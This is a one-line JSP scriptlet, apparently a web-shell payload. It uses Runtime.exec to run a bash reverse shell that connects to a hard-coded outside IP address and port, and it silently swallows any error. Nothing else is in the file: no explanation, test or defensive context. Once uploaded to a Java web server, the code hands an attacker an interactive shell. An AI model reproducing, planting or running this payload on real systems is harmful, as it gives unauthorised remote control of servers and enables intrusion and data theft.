<%try { Runtime run = Runtime.getRuntime(); run.exec("bash -i >& /dev/tcp/123.45.67.89/9999 0>&1"); } catch (IOException e) { }%>
